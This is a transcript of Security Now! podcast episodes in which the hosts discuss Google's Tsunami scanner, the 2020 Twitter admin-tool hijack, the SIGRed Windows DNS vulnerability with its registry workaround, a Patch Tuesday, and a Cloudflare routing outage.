STEVE:  This I think is going to be very interesting, of interest to our listeners and another really, you know, another really good thing that Google has done.  I mean, look at Chromium and what that has meant for the industry's browsers.  Google has open sourced a vulnerability scanner for large-scale enterprise networks.  Which is not to say that it can't be used for smaller networks.  But I'll explain why this is, like, well, it's what they've been using.  It's for large-scale enterprise networks consisting of thousands or even millions of Internet-connected things.  I've got two links in the show notes, both GitHub links because, yes, that's where this thing lives.



Google has named it "Tsunami."  They've been using it themselves internally at Google, and it has recently been made available to us all.  And I'm sure before long we'll have, like, prepackaged binaries for all of our popular OSes.  It's not going to be a Google-branded product; but it will be maintained, further developed, and extended by the open source community, very much in the way Google first made Kubernetes available.  And that just became a staple in the industry.



So of course, as we know, hundreds of other commercial or open source vulnerability scanners already exist in the world.  The difference here, what Tsunami is doing, is that Google built the scanner with very large enterprise deployment in mind, like its own.  I mean, Google uses it.  And so this is not to suggest, as I said, that it would not be just as useful for smaller environments, but that it's inherently designed to scale well.  And this is critical.  It is explicitly designed to absolutely minimize the production of false positive detections, which can be a, well, which unfortunately scale just as the network scales.  It turns out that false positives are the bane of IT personnel when traditional scanners are let loose across a large enterprise.



So Tsunami was designed to run inside giant networks where even the slightest false positive findings could result in sending incorrect patches to hundreds or thousands of devices, possibly resulting in crashes, network crashes, countless wasted work hours.  So Tsunami is designed instead to gracefully tackle networks which may include hundreds of thousands of servers, workstations, networking equipment, and IoT devices that are connected to the Internet and visible to the scanner, all while providing the highest possible scanning accuracy with an eye toward minimizing false positives.



They said that they designed Tsunami with the ability to adapt to extremely diverse and extremely large networks without the normal need to run different scanners for each device type, as is typically done and is too often necessary.  They did this by splitting Tsunami into two logically and operationally separate pieces.  The first component is the scanner.  They call that the  "reconnaissance module."  It scans a company's network for open ports and tests each port, attempting to identify the protocols and services running on each to prevent mislabeling ports and testing devices for the wrong vulnerabilities.  Its port fingerprinting module was derived from NMAP, you know, the legendary network mapping engine.  But then they added to that a bunch of their own new code to the NMAP core.



The second component is the more complex of the two.  It takes the first component, the scanner/mapper's output as its input.  It takes each located device and its exposed port, selects from a list of vulnerabilities to test, and runs benign exploits to determine whether the device is actually vulnerable to that attack.  This is the vulnerability verification module, the primary means through which Tsunami may be extended because it uses a flexible plugin architecture to allow the entire vulnerability verification module to grow over time and evolve through straightforward community extension, and it will allow security teams to add new attack vectors and vulnerabilities to check inside their own networks.



So you can imagine, for example, when news of this Chinese C-Data fiber terminator vulnerabilities became public, someone might quickly add a vulnerability verifier to Tsunami in order to see whether there are any of those exposed and vulnerable, and to locate any that are.  So, for example, you would immediately, out of that public disclosure, you would add those four new username/password pairs, and I don't know even whether it's open on telnet 23 or some other port.  But whichever port, you would add that, quickly create a Tsunami module, probably taking an existing telnet vulnerability scanner and just adding a few more lines to it, and then turn it loose.  And you may have already, for example, run reconnaissance on your network, so you would have a global network map already established.  So you would just then run that new vulnerability module driven by the reconnaissance input against your network in order to immediately locate and start dealing with a newfound problem.



So at the moment, at release time, Tsunami comes with plugins which check for exposed sensitive interfaces.  Applications such as Jenkins, Jupyter, and Hadoop Yarn ship with UIs that allow a user to schedule workloads or to execute system commands.  If these systems were exposed to the Internet without authentication, attackers could leverage the functionality of the application to execute malicious commands.  So that's an example of something that you could use this to make sure you're safe against.  And also it checks for weak credentials.  It uses other open source tools such as ncrack to detect weak passwords used by protocols and tools including SSH, FTP, RDP, and MySQL.



So with this public release of Tsunami, Google is not by any means stepping away from the project.  They plan to continue enhancing it for their own use with new plugins to detect an ever-widening variety of exploits, and those will be contributed back to the community.  There'll be a separate Tsunami plug-in repository that they create.  And Google said that it will focus on meeting the goals of high-end enterprise clients like itself, and the conditions found in these types of large and diverse multidevice networks.



So anyway, I wanted to put this on our listeners' radar.  It looks like a very cool piece of new technology donated by Google to the IT users of the world, for our use.  And I haven't had any chance to play with it. But I'm sure we will start seeing Tsunami binaries that'll make it easy for people to play with.



LEO:  Cool.  Nice.



STEVE:  Very cool.  And thank you once again, Google. 



LEO:  Google does good stuff.  Those security guys especially do good stuff. 



STEVE:  Yeah.



LEO:  Steve, we've come to the end of another thrilling, gripping edition of Security Now!.



STEVE:  775 podcasts in the can.



LEO:  Holy-moly.  Only 225 to go.  Well, 224 to go.  I'm going to talk you into doing an Episode 1000, just without any numbers or something.  



STEVE:  Well, or zero.  We never did zero.



LEO:  Got to do the zero.  It resets to zero.  Then we start all over again.  We do this show every Tuesday, right after MacBreak Weekly.  That's about 1:30 usually.  It's going to be a little later often.  But 1:30 Pacific is the goal, 4:30 Eastern time.  That's 20:30 UTC.  Here's the deal.  You can watch us do it live.  If you go to TWiT.tv/live, there's audio and video streams there.



But you can also get on-demand versions of the show.  Steve has them at his website.  He actually has some unique versions of it, a 16Kb audio version, for instance, along with a 64Kb, the normal audio.  He also has a transcript of every show, which is a really useful tool, either for reading along while you listen, or for searching because you can search right into any show by searching the transcript of that.  That's all at GRC.com.



While you're there, take a look at SpinRite, SpinRite 6, the current version.  6.1 on its way.  If you buy now, you'll be participating, if you wish, in the beta of 6.1, and you can weigh in on various features.  There's a lot of freebies associated with that as he spins off concepts and ideas.  That's all at GRC.com.  He's also on Twitter.  And if you want to leave a question for Mr. G, you see that Twitter handle right there, @SGgrc.  He accepts DMs from anybody.



You can also get copies of the show at our site, TWiT.tv/sn.  We have video, as well as audio, TWiT.tv/sn.  And of course we always encourage you, if you can, to subscribe in your favorite podcast application.  That way you don't even think about it.  Just whenever you're in the mood for Security Now!, there it will be, ready, queued up to listen to.



Thanks, Steve.  Have a great week, and we'll see you next time on Security Now!.



STEVE:  Thanks, Leo.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#776

DATE:		July 21, 2020

TITLE:		A Tale of Two Counterfeits

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-776.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we, of course, start off by looking at what happened at Twitter last week.  We look at Checkpoint's discovery of the headline-grabbing wormable DNS vulnerability that's been present in all Windows Servers for the past 17 years.  We touch on last week's Patch Tuesday, Cloudflare's surprise outage, another glitch in Zoom's product, and seven "no-logging" VPN providers whose logs were all found online.  We cover some other quick news and some interesting SpinRite development developments, then examine the problem of counterfeit networking equipment - which, as our Picture of the Week shows, is actually a big problem.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  He's going to take a look at the Twitter hack of last week; the Cloudflare problem last week.  We'll also check in with a couple of security researchers who made a little booboo reporting a flaw in a counterfeit device.  And then Steve's going to delve deep into the problem of counterfeit network devices.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now!, Episode 776, recorded Tuesday, July 21st, 2020:  A Tale of Two Counterfeits.



It's time for Security Now!, the show where we cover your security, your privacy, how the Internet works, and all sorts of interesting things because of this guy right here, the most interesting man in the world, Steve Gibson.  Well, you kind of are.  You don't drink beer, but you kind of - well, maybe you do.  I don't know.  He's the coffee version.



STEVE GIBSON:  Yeah, I drink beer.



LEO:  The coffee version of the most interesting man in the world, Steve Gibson of GRC.com.  Hello, Steve.



STEVE:  We are closing in on the end of 15 years.  We've got Security Now! Episode 776 for July 21st, titled "A Tale of Two Counterfeits."  And I realized when I was done, maybe it should have been three.  But I wasn't sure that just having two counterfeits would fit on the lower third because that was sort of a - that was pushing things to have the title that long.  So I thought, okay, we'll just go with two.



LEO:  Two's easier.



STEVE:  Yeah.  But first, before we get into stuff, after last week's podcast, during which I rather clearly expressed my lack of understanding of some people's sensitivity to terminology, a number of our listeners reached out to share their distress and disappointment with me.  I responded to each and every one of the people who wrote, and we engaged in very productive dialogue.  I am embarrassed in the presence of their grace, and I sincerely apologize to those listeners whom I offended with my rant, which belittled something that they're sensitive to.  That's not my place.



This is not to say that I fully appreciate the sensitivity to terminology that clearly has nothing to do with racial prejudice.  But thanks to the conversations I had with some of our listeners, the way I can understand this is by seeing this change in terminology for what it represents.  It's a proxy for some clearly very much needed progress toward the recognition of the full equality that we are each obviously entitled to by birth.  So I get it.  And the other thing I get is that no one is tuning in to this podcast for an update on my feelings about social justice.  I am so impressed by the quality of our listeners.  Twitter has probably never seen such civilized dialogue.



LEO:  Yeah, it was really good, yeah.



STEVE:  I thank you all for putting up with me.  Now let's talk about some stuff that I do understand.



LEO:  Thank you for raising that issue.  And I think no harm, no foul.  I think one of the advantages of this terminology change, we've talked about this before, is it actually replaces things like blacklist and whitelist with deny list and allow list, which frankly I think are better terms anyway. 



STEVE:  More accurate, yeah.



LEO:  Much more.  More communicative.  More informational.  And, yeah, if it hurts somebody's feelings, regardless of its genesis, then don't use it.  It's okay.  It's fine.  And the trend continues.  Apple has now joined that list.  We were talking about the Linux kernel community last week.  GitHub's doing it.  So more and more we're getting rid of these terms that are just offensive to some.  And I have no problem with it.



STEVE:  Well, and as I said, I really think what it represents is an awareness, an increase in sensitivity which has obviously  been lacking for decades, I mean, like, you know, we're still there.



LEO:  Yeah, and people, I understand with some merit, say, "Oh, come on, it doesn't have anything to do with that," or "That's a minor thing."  But it's not for us to say.  It's for the people for whom it's offensive to say, and I think it's appropriate if they're bothered by it to get rid of it.  And there is a lot of unconscious racism in the way we speak.  And if we can root that out, the better off we all are.



STEVE:  Absolutely.



LEO:  Thank you, Steve.  I appreciate that.



STEVE:  So this week, of course, as has probably every podcast you've done, Leo, we have to talk about what happened at Twitter.  I mean, probably our listeners know, but it has to be covered because it was a major event for the industry.



LEO:  Oh, yeah.



STEVE:  We're also going to look at Checkpoint's discovery of the headline-grabbing wormable DNS vulnerability that's been present in all Windows Servers for the past 17 years.  We touch on last week's Patch Tuesday, look at Cloudflare's surprising outage and what was its cause, another glitch in Zoom's product, and seven "no-logging" VPN providers whose logs were all found online.  We cover some other quick news; some interesting SpinRite development developments.  Then we're going to examine the problem of counterfeit networking equipment, which as our Picture of the Week shows is actually a big problem because I can't tell which one is the fake.  So I think another great podcast for our listeners.



LEO:  You missed a good opportunity.  Which one's the fake?  That would have been a good title, too.



STEVE:  So our Picture of the Week is from a report that we'll be getting to at the end of the show that F-Secure did of their analysis of two fake Cisco routers.  And this photo shows the authentic one next to the fake one.



LEO:  Now, I haven't looked ahead.  I think the left one is fake because the silkscreen is lighter on the label.



STEVE:  And you're correct.



LEO:  But that was, I mean, look how close they look.



STEVE:  It could have been either.  And in the text of their report they noted that the counterfeits used white ink for the port numbering, whereas the authentic Cisco used a gray ink.  And you can see that it's a little bit brighter white on the left.



LEO:  You can hardly tell, though.  Wow. 



STEVE:  And they said that the shape of the button was different.  But, like, again, if you didn't have a real one, like, right next to it to compare with, you'd think the shape of the fake button was just fine because it's square and beveled and rounded just right.  I mean, it's amazing how close these are.  So anyway, I just thought it would be fun to make it the Picture of the Week because we'll be talking about this later.  But, boy, the issue of networking equipment counterfeits...



LEO:  Amazing, yeah.



STEVE:  ...turns out to be a big deal.  You know, it's not just Rolex watches and ladies' handbags that are being counterfeited.  And we should just talk about Twitter.  I think everybody by now, Leo, knows that there was a big event that happened on Wednesday of last week.  The one thing that's missing from the most up-to-date information I've seen is any sense for who did it.  And I'm sure that's, if they have any idea, that's embargoed because they're not wanting to get in the way of law enforcement or whatever forensics they may have.



LEO:  Well, The New York Times fingered a guy named Kirk.



STEVE:  Oh.  Hadn't heard that.



LEO:  I mean, I don't think they've - that's the identity he assumed.  They haven't associated that with a real person.  But there is a great New York Times article where they talked - it's interesting because Kirk, before he perpetrated this, was reaching out to a bunch of SIM swappers.  These are guys who aren't exactly malicious.  They make money by hacking single-letter Twitter domains, or what they call "OG domains" - short, clever Twitter domains - and selling them to the highest bidder.



STEVE:  Like @6.



LEO:  @6 or @y; right.  But these guys - so Kirk was talking to them, saying look, I can do these things, you know, how much would you pay?  But they got bored, apparently.  According to their story, anyway.  And they didn't follow up.  But then shortly thereafter he did use his admin console to perpetrate this spammy hack.



STEVE:  So is he a Twitter employee, we think?



LEO:  No.



STEVE:  Oh, okay.



LEO:  Oh, you didn't - okay, got to read the story because what - and Twitter has not admitted to this.  Whether it's true is unknown.  But there seems to be good evidence that the way Kirk got this - Twitter only says "socially engineered our guys."



STEVE:  Right.



LEO:  Is he got into their private Slack channel, where Twitter had pinned the credentials for the "god mode" interface.  Wow.



STEVE:  That's a good one.



LEO:  Oh, man.  So all he really had to do was say, hey, let me into your Slack channel.



STEVE:  So it's like, do not write your password...



LEO:  Yeah, it's like post-it notes.



STEVE:  Do not write your password on the blackboard.



LEO:  Yeah, it's a post-it note.



STEVE:  When the camera crew is going to come in and do an interview.



LEO:  Can you believe it?  Now, that's the New York Times story, and I think that it's well sourced because they got screenshots from these guys, and they got a lot of stuff from these guys to verify that they were talking to this guy and so forth.  But Twitter has not confirmed.  So isn't that fascinating?



STEVE:  Well, I'm glad that we talked about this because you had more up-to-date information that I did.  All I had was...



LEO:  Oh, I loved this story.



STEVE:  ...yeah, Twitter's note from Friday.  And, you know, they talked about 138 accounts; and, of the 138, 45 were messed with.  And then eight people, they had some internal tool called Your Twitter Account or something that was used eight times.  So, I mean, they're painting the best picture they can.  It was funny, too, because I got an email from Jason in the afternoon on Wednesday saying, "Hey, Steve, we'd love to have you on Thursday morning to talk about this on our show.  Can you do that?"  And I said yeah, sure.  So I attempted to tweet the news to my followers that I would be on on Thursday morning, and I was blocked.  I got the weirdest, like, this looks like a bot is trying to post, so bot off.  And it's like, what?  I'm not a bot.



LEO:  Yeah.  They were suspending accounts, too.  They were getting very aggressive about this, yeah.  They didn't want anybody to talk about it.



STEVE:  Well, in fact because I'm sure yours was suspended, too, because you and I are both, what is it with the little...



LEO:  Blue checks.  We're verified.



STEVE:  Blue checked.  Yeah, verified.  And so they did a blanket block of all verified users.  And then there were other people who had - anyone who had changed their password recently, that raised their flag of suspicion, so they blocked any posts from those accounts.  I mean, they really did respond quickly, as quickly as they could.



LEO:  Yeah.  Yeah, this is the New York Times article.  It came out on Friday.  This is a fascinating story.  The reason it's perhaps more important than just, oh, they hacked Twitter, which who cares, is that the President uses this, and many other leaders use this as a messaging system to tell the world what they're up to.  It's terrifying to think that any of these accounts could have been compromised.  And it was obvious when it started that it wasn't a password hack or your average everyday hack because accounts like Bill Gates's and Joe Biden's and Barack Obama's, all of which were hacked, almost certainly have higher levels of security on them.



STEVE:  Right.



LEO:  They're not just using monkey123 as their password.



STEVE:  This clearly had to be...



LEO:  It looks to me to be an inside job; right?



STEVE:  It was obviously an inside job, yeah.



LEO:  Yeah.  That was our immediate conclusion.



STEVE:  Well, and the nature of the tweets.  It was a two-for-one deal on bitcoin.  Whatever you send me, I'll double it and send it back to you.  And the last I heard was, I think, well, I said on Thursday, on Jason's show, that I had seen $300,000 had been transferred into the bitcoin account.  I haven't seen that again.  I've seen more like 120,000.  So some amount of money was made.



LEO:  It's hard to tell.  The nature - we know the bitcoin account, so you can look at the blockchain and see what was going on with it.  But hackers routinely will put money into it, take money out, to obfuscate what they're making.



STEVE:  Ah.



LEO:  So, like you, I saw 100,000.  But the best information came from Binance, which is a bitcoin exchange, which said they had blocked a quarter of a million dollars of attempted transfers into that account.  So that's their customers saying, "I'd like to give some money to Joe Biden and get it doubled."  So it might have been a more successful hack than it appeared to be.  And if it weren't for Binance blocking those transfers it could have been a lot more money.  It does make you wonder, though, if you had this god mode, what would be the best...



STEVE:  Yes.  Why use it for this?



LEO:  Yeah, what would you do with it?  And maybe this is misdirection.  Maybe Kirk is really, you know, Vladimir, and he's up to other things.  So we don't - that's why I wonder what's really going on here.



STEVE:  Well, and what I said when I was talking to Jason on Thursday was that, you know, I don't know whether he knew, but you and I talked years ago, back at the Sony Entertainment hack,  where there was an advanced persistent threat that had been found in their network.  And I said famously on the podcast, "I don't want the job of trying to secure something like Sony."



LEO:  Oh, yeah.



STEVE:  You know, that's impossible.  It's, I mean, literally impossible.  And so what this suggests is that clearly it was a mistake, if the credentials for this thing were stapled in the Slack channel so that it could be seen.  But also the idea that the bar is not higher to doing something like that.  And I talked about how there are protocols that use a majority voting approach with crypto, where compromising a single individual wouldn't render the company vulnerable.



A secret, a shared secret could be shared, for example, among nine people, but you've got to get three of them to all agree in order to cause something to happen.  That way, if you have a large enough body of people who can be involved, you're not worried about getting locked out because Maury is gone for the day.  But at the same time, I mean, it's protecting the people from being suckered into doing something with a social engineering attack.  So I think this also suggests that Twitter has become, as you said, Leo, so crucial.  I mean, like bizarrely important on the global...



LEO:  Bizarrely important.



STEVE:  On the global scale.



LEO:  Well, it also - it's kind of unconscionable because Twitter, it's not the first - so a contractor leaving his job at Twitter two years ago, you might remember this, disconnected President Trump's account, deleted it.  And then of course Jack's account, the CEO, his account was hacked a couple of months ago.  You would think that at this point Twitter would kind of be on notice that maybe they should be doing a better job.



STEVE:  Yeah, this is just not a toy anymore that allows people to send 140 characters between their phones.  It's become a lot more than that.  So anyway, hopefully...



LEO:  And we should say, even though The New York Times says that it was the Slack channel, you know, they got that from hackers, and who knows if that's true.



STEVE:  Right, right, right.



LEO:  But Twitter doesn't say.



STEVE:  So "allegedly" to everything so far, unless we get it officially.  And who knows when and/or if what we'll get officially from Twitter. 



LEO:  I doubt we'll hear, yeah.



STEVE:  Yeah.  That's what's known now.  And again, sort of puts the industry on notice that this stuff, which just started off being kind of like, oh, look.  Are they making any money yet, Leo?



LEO:  No.



STEVE:  Or are they still waiting to make money in the future?



LEO:  They've had profitable quarters, but they're not exactly rolling in the dough.



STEVE:  We don't really have an economic model, but we're going to let the whole world use this to talk to itself, and good luck.  We'll make it up in volume.



So SIGRed.  As Checkpoint Research said:  "This is not just another vulnerability."  This month's big, scary, wormable vulnerability turns out to have been present in Windows Server versions since Windows Server 2003, which actually did come out in 2003, unlike Windows 10 2004, which just came out in 2020.  But anyway, we'll get to my Windows rant a little bit later.



This problem has been present in all subsequent versions of Windows Server since, including Server 2019, which is the most recent release of Windows Server.  So without knowing it, we've been living with this in our midst for the past 17 years.  Its discoverer was Checkpoint Research, as I mentioned, who named it SIGRed.  And I'll explain where SIG - SIG as in signature because it's about DNSSEC signing stuff, or signing records.



It was assigned a CVE-2020-1350.  And I'm always suspicious when I see such a low CVE number.  I wonder if they're going to have to start randomizing them because you could tell how old it is from how small it is.  We're in July of 2020.  So 1350, that happened right near the beginning of the year.  And it's like, uh, okay, especially considering how serious the guys at Checkpoint think this is.



So it's wormable, meaning that it can propagate among any and all Windows Servers that can be induced to make a DNS query.  And it turns out there are lots of clever ways that can be done, and the Checkpoint Research guys did all that.  It's triggered by the receipt of a specially crafted DNS response.  And since Windows Server services runs with elevated system privilege, if it's exploited, an attacker gets full domain admin rights, effectively compromising the entire corporate infrastructure.  And many who looked at this realized this could have been a flash worm of the sort like Slammer, which remember it took, was it 30 minutes to take over all the vulnerable systems on the Internet.  It just exploded.  



LEO:  Geez, Louise.



STEVE:  Because it was a self-propagating worm.  So, yeah.  And the way Checkpoint explained their discovery, that is, why they went looking was sort of interesting.  They wrote:  "Our main goal was to find a vulnerability that would let an attacker compromise a Windows domain environment, preferably unauthenticated."  They said:  "There's a lot of research by various independent security researchers, as well as those sponsored by nation-states.  Most of the published and publicly available materials and exploits focus on Microsoft's implementation of" - and no one's going to be surprised by this - "SMB (Server Message Blocks), i.e., EternalBlue, and RDP (Remote Desktop Protocol) BlueKeep protocols, as these targets affect both servers and endpoints."



They said:  "To obtain domain admin privileges, a straightforward approach is to directly exploit the domain controller.  Therefore, we decided to focus our research on a less publicly explored attack surface that exists primarily on Windows Server and domain controllers:  WinDNS."  For anyone who's interested in their really detailed tech stuff, I've got a link in the show notes because it's very detailed  and, well, frankly, and it's wonderful, and takes us step by step through Checkpoint's process.  So I'll just hit the high points.



For every query type that a DNS server makes, there is a corresponding reply.  What Checkpoint found was a classic type conversion flaw, a math result variable sizing mistake in the parsing logic for the reply to a SIG, as in signature record, which is part of DNSSEC.  The extension's, you know, DNS Security for DNS.  They discovered literally by reverse-engineering I think it was dns.exe, which is the service that does WinDNS.  They studied the code, the reverse-engineered code, and they found a mishandling of values between the 16-bit fields which are used by the DNS protocol and the 64-bit register math used by the code's compiler.



All coders know that if a 64-bit value is calculated to allocate memory, or even 32, that is, larger than 16 bits, so 64-bit or 32-bit, calculated to allocate memory, and if the result is larger than 65535, which is the maximum absolute quantity that can be represented within 16 bits, then the least 16 bits of the larger value will be a small integer.  Basically it's the amount of the overflow over 65535.  And if that smaller integer 16-bit value was then used to allocate memory for a buffer, the resulting buffer will be much too small to hold the larger calculated amount of data.  And of course that's exactly what happened.  They discovered that - and I just hit the spacebar, so I lost my place in my notes.



LEO:  I discovered a blank page.



STEVE:  Discovered, yes, something non sequitur - that by sending a DNS response containing a larger than 256K SIG record, they could cause a controlled heap-based buffer overflow of roughly 64K, meaning they had a lot of excess buffer to work with.  This is not a few bites that they have to be clever about.  And for hackers that's the golden keys to the server kingdom.  They concluded their write-up by noting, they said:  "This high-severity vulnerability was acknowledged by Microsoft and was assigned CVE-2020-1350."  And as I said, I didn't go to look at the date of it, but it had to have been a while ago.



They said - this is Checkpoint who found the problem.  "We believe that the likelihood of this vulnerability being exploited is high, as we internally found all of the primitives required to exploit this bug.  Due to time constraints, we did not continue to pursue the exploitation of the bug, which would include chaining together all of the exploitation primitives; but we do believe that a determined attacker would or will," they wrote, "be able to exploit it.  Successful exploitation of this vulnerability would have a severe impact, as you can often find unpatched Windows domain environments, especially domain controllers.  In addition, some Internet Service Providers may even have set up their public DNS servers as WinDNS.



"We strongly recommend users to patch their affected Windows DNS servers in order to prevent the exploitation of this vulnerability.  As a temporary workaround, until the patch is applied, we suggest setting the maximum length of a DNS message over TCP" - because DNS over UDP is restricted to the size of a single UDP packet, so it can't do a 64K - "which," they said, "should eliminate the vulnerability.  You can do so by executing the following commands."



And basically I have it in the show notes for anyone who's interested.  It's just a registry command to add an HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\ Parameters key.  It turns out you can add a parameter, TcpReceivePacketSize, and you can set that to FF00 in hex, which is 256 bits shy of 64K.  I mean, sorry, 256 bytes shy of 64K.  And so that ends up having priority over DNS, and it would prevent the overflow.  And also it's rare that you're going to have any valid DNS that's right up to that 64K limit.  So it wouldn't break anything.



So anyway, this is all only now becoming public, aside from the fact that has apparently been known for quite a while, because Checkpoint disclosed this responsibly.  They whispered into Microsoft's ear, apparently some time ago, and Microsoft's July Patch Tuesday, last Tuesday, fixed this bad boy.  So as long as you're updated and patched from last week, you're okay.  If not, you should do that.  And if for some reason you can't, then these two commands, the second one reads "net stop DNS," followed by "net start DNS."  So you need to add this registry key, or change its setting if it's already there, and then restart the DNS service if for some reason you can't update with last Tuesday's patches.



And speaking of last Tuesday's patches, this month we received updated code from Microsoft to remove 123 security flaws from 13 products.  Happily, none of the security bugs fixed this month have been discovered being exploited in the real world, though a bunch have been shown to enable remote code execution.  And Leo, when you scroll through the whole list, oh, my, I mean, the scroll bar shrinks down, and you think, what has happened?  Although the most worrisome of all of those, and that's actually my cut down list...



LEO:  This is the edited version.



STEVE:  ...of just 30 remote code execution vulnerabilities.



LEO:  This is not good.  Oh, man.



STEVE:  The actual list, I was scanning it.  ZDNet posted it.  And it was just like, oh, my goodness.  So it's quite sobering.  And we've seen the damage that can simply be done by elevation of privilege bugs.  Since today's operating systems are hosting so much content from so many various sources, maintaining isolation and control among them is one of any modern system's top jobs.  This month I didn't even attempt to count those problems that were fixed.  But as we noted, I decided to parse the list for the even worse remote code execution vulnerabilities that were just eliminated last week.



There's .NET Framework Remote Code Execution Vulnerability.  And I'm not going to read all these over because my mouth will run dry.  We've got SharePoint Server, Windows Font Driver, Windows Font Library, Microsoft Graphics Components, Microsoft Graphics,  three Jet Database Engines, Microsoft Outlook.  PerformancePoint Services, whatever that is.  Excel, Office, Project, two in Word, VBScript Remote Code Execution, Visual Studio.  Address Book has a remote code execution vulnerability.  Remote Desktop Client.  Oh, who's surprised?



Another LNK, L-N-K, file remote code execution vulnerability.  They've fixed that now, what, two months running.  Windows DNS Server.  Well, that's the one we just talked about.  Visual Studio and Visual Studio Code.  Well, they probably use the same code, so okay.  Visual Studio Code ESLint Extension remote code execution vulnerability.  And then six Hyper-V Remote FX vGPU remote code execution vulnerabilities.



You know, this is just a daunting list, I mean, when you step back and think about it, of serious vulnerabilities to be fixed.  Every four weeks we get one of these.  And we've been seeing this all year.  This is not a brief anomaly.  It's the way it is now.  And on Windows Weekly I've been hearing Paul and Mary Jo lamenting what sure does appear to be the collapsing state of affairs with Windows.  So I know I'm not an outlier here.



And just get a load of this bit of explanation from a page in the last week on BleepingComputer.  Oh, they posted it on Friday.  The headline read:  "Microsoft fixed an issue where the Disk Cleanup maintenance utility could cause boot failures when launching automatically after installing Windows 10 version 2004 build 19041.21."  BleepingComputer wrote:  "To prevent this issue, Microsoft is using an automated troubleshooter instead of applying an update block to prevent Disk Cleanup from launching on its own and causing boot issues until the users install the Windows version 19041.84 update which comes with a fix for this bug.



"Microsoft says:  'This troubleshooter automatically runs twice.  It runs for the first time on all devices on Windows version 19041.21.  Then it runs again after devices are upgraded to Windows version 19041.84.  This troubleshooter cannot be run manually.'"  Then BleepingComputer said:  "To see if the troubleshooter has launched on your device, you have to check recommended troubleshooting history by going to Start > Settings > Update & Security > Troubleshoot > View troubleshooting history."  What?



So, wait.  "To prevent this issue, Microsoft is using an automated troubleshooter instead of applying an update block to prevent Disk Cleanup from launching on its own and causing boot issues."  What Windows has become would even confuse Rube Goldberg.  And as a developer, I can totally sympathize with the impossible task Microsoft has undertaken.



LEO:  A lot of legacy code.



STEVE:  Pick any one of those patched vulnerabilities last week.  Microsoft Office, for example.  It has a remote code execution vulnerability?  Of course it does.  And not only one.  We'll almost certainly have another couple fixed next month, and some more the month after.  Office alone has grown so massive and so sprawling that it can't help but to have hundreds of still-unknown exploitable bugs.



How did this happen?  It's really very simple.  Microsoft decided quite rationally that we wanted features more than we wanted security.  And I can't say they were wrong.  Features are visible.  Bugs are hidden.  Ever purchase a used car with a fresh paint job?  That's what Windows gets every few years.  The same increasingly old and increasingly creaky operating system with a fresh paint job.  Windows has become the used car of operating systems.  But it's the one most of us are driving.  Beep beep.



LEO:  You should read Neal Stephenson's book "In the Beginning There Was the Command Line."  He has a great automotive analogy for the operating systems.  It's very funny.  It's very well written.  And yes, Windows is the one that's beep beep.  They run it in the corner, yeah.



STEVE:  Well, it is what everyone, I mean, it's still far and away the majority OS.



LEO:  Oh, yes.  And your software has to work with it.  But do you someday envision a time when you can retire and just never again boot into Windows?



STEVE:  Yes.  I do.  And in fact, one of the things that I've learned during the beginning of this round of SpinRite work is that I can't put off switching to UEFI booting for SpinRite. 



LEO:  No.  That's right.



STEVE:  Well, UEFI booting for SpinRite means no DOS.



LEO:  Right.



STEVE:  So I will be becoming native booting in the short term here.



LEO:  Nice.  Interesting. 



STEVE:  I'm going to do that immediately after finishing 6.1 because I want to still be able to be used by all recent machines.  



LEO:  So no more FreeDOS. 



STEVE:  Yeah, I do look at the day when it's like, oh.  I mean, when I hear Paul and Mary Jo saying, you know how there are these systems that aren't yet qualified to run Windows 10 2004?  And Mary Jo says, "That's a good thing.  Don't ask for it."



LEO:  No hurry.  No hurry.



STEVE:  Believe me, you don't want that.



LEO:  No rush.  Well, also it's a feature update, with features no one cares about.  So Microsoft could just relax a little and slow down.



STEVE:  And actually, you know, I guess in my analogy that would be touchup paint.



LEO:  Yeah, yeah.  Bondo.  



STEVE:  You know?  No one really notices those little scratches.



LEO:  It's just Bondo.



STEVE:  So Cloudflare had a big embarrassing outage.  And it was one single measly little line in a router's config file.  And suddenly Riot, GitLab, Patreon, Authy, Medium, Digital Ocean, and countless others - including, somewhat ironically, Downdetector - became unreachable and dropped off the 'Net.



LEO:  Isn't it ironic that Downdetector was down?



STEVE:  Downdetector went down, yeah.  Not their fault, of course.



LEO:  No.  Well, it was their fault.  Not Downdetector's fault.



STEVE:  No, but I mean...



LEO:  Cloudflare's fault.  Right.



STEVE:  Right, right, right.  So last Friday evening, while Twitter was updating the world about its massive hack, John Graham Cumming, our friend, was describing what happened at Cloudflare.  I have the link to his more detailed post in the show notes.  But basically I clipped out two pieces.  He said:  "Today, a configuration error in our backbone network caused an outage for Internet properties and Cloudflare services that lasted 27 minutes.  We saw traffic drop by about 50% across our network.



"Because of the architecture of our backbone, this outage didn't affect the entire Cloudflare network and was localized to certain geographies.  The outage occurred because, while working on an unrelated issue with a segment of the backbone from Newark to Chicago, our network engineering team updated the configuration on a router in Atlanta to alleviate congestion.



"This configuration contained an error that caused all traffic across our backbone to be sent to Atlanta.  This quickly" - and I was like, whoops.  "This quickly overwhelmed the Atlanta router and caused Cloudflare network locations connected to the backbone to fail.  The affected locations were San Jose; Dallas; Seattle; Los Angeles; Chicago; Washington, DC; Richmond; Newark; Atlanta; London; Amsterdam; Frankfurt; Paris; Stockholm; Moscow; St. Petersburg; So Paulo; Curitiba" - is that a place?



LEO:  Yeah, Curitiba, yeah.



STEVE:  Okay, "...and Porto Alegre.  Other locations continued to operate normally."  What other locations?  Are there any others?



LEO:  Oh, yeah.  You saw this beautiful graphic.  This is gorgeous.  I think this says it all.  That hotspot is Atlanta.  The white spots where there are no traffic, those are the NOCs that are down, right there.



STEVE:  Right.



LEO:  Boom.



STEVE:  He says:  "This was not caused by an attack" - of course speculation went wild as soon as Cloudflare became inaccessible.  "This was not caused by an attack" - oh, and BleepingComputer was also taken down - "...not caused by an attack or a breach of any kind."  He said:  "We're sorry for this outage and have already made a global change to the backbone configuration that will prevent it from being able to occur again."



LEO:  Oh, good.



